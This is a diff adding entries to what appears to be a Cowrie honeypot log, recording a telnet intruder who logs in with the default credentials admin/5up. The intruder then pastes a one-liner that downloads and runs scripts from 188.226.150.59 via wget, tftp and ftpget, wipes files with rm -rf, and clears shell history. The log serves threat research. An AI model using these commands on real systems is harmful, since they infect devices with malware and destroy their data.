@@ -5551,3 +5551,48 @@
 2017-04-26T17:28:55+0000 [CowrieTelnetTransport,20510,117.221.88.90] Opening TTY Log: log/tty/20170426-172855-None-20510i.log
 2017-04-26T17:28:55+0000 [CowrieTelnetTransport,20510,117.221.88.90] Warning: state changed and new state returned
 2017-04-26T17:28:56+0000 [CowrieTelnetTransport,20510,117.221.88.90] Received unhandled keyID: '\x00'
+2017-04-26T17:29:12+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 37.139.24.28:55226 (10.8.41.81:2223) [session: TT20511]
+2017-04-26T17:29:12+0000 [CowrieTelnetTransport,20511,37.139.24.28] first time for 37.139.24.28, need: 1
+2017-04-26T17:29:12+0000 [CowrieTelnetTransport,20511,37.139.24.28] login attempt: 1
+2017-04-26T17:29:13+0000 [CowrieTelnetTransport,20511,37.139.24.28] login attempt [admin/5up] succeeded
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] Opening TTY Log: log/tty/20170426-172915-None-20511i.log
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] Warning: state changed and new state returned
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] CMD: sh
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: sh 
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] CMD: shell
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command not found: shell
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] CMD: help
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: help 
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] CMD: busybox
+2017-04-26T17:29:15+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: busybox 
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] CMD: cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://188.226.150.59/Legacy.sh; chmod 777 Legacy.sh; sh Legacy.sh; tftp 188.226.150.59 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 188.226.150.59; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.226.150.59 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Legacy.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: cd /tmp
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: cd /var/system
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: cd /mnt
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: cd /root
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: cd /
+2017-04-26T17:29:25+0000 [CowrieTelnetTransport,20511,37.139.24.28] Command found: wget http://188.226.150.59/Legacy.sh
+2017-04-26T17:29:25+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://188.226.150.59/Legacy.sh>
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Downloaded URL (http://188.226.150.59/Legacy.sh) with SHA-256 1e770a51d989ed0216193f9f090f8c8d4d90449d4299680d1d1f5448f3c69942 to dl/1e770a51d989ed0216193f9f090f8c8d4d90449d4299680d1d1f5448f3c69942
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 /Legacy.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: sh /Legacy.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: tftp 188.226.150.59 -c get tftp1.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 188.226.150.59
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 188.226.150.59 ftp1.sh ftp1.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://188.226.150.59/ftp1.sh) with SHA-256 a1c2cda19645e5d2805f44195e6736424c23a0f32e3f96212a0043d5e937e088 to dl/a1c2cda19645e5d2805f44195e6736424c23a0f32e3f96212a0043d5e937e088
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: sh /ftp1.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: rm -rf /Legacy.sh tftp1.sh tftp2.sh /ftp1.sh
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-04-26T17:29:25+0000 [HTTPPageDownloader,client] Command found: history -c
+2017-04-26T17:29:25+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://188.226.150.59/Legacy.sh>
+2017-04-26T17:29:58+0000 [CowrieTelnetTransport,20510,117.221.88.90] CMD: enable
+2017-04-26T17:29:58+0000 [CowrieTelnetTransport,20510,117.221.88.90] Command found: enable 
+2017-04-26T17:29:58+0000 [CowrieTelnetTransport,20510,117.221.88.90] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-26T17:29:58+0000 [CowrieTelnetTransport,20510,117.221.88.90] Closing TTY Log: log/tty/20170426-172855-None-20510i.log after 62 seconds
+2017-04-26T17:29:58+0000 [CowrieTelnetTransport,20510,117.221.88.90] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-26T17:29:58+0000 [CowrieTelnetTransport,20510,117.221.88.90] Connection lost after 66 seconds
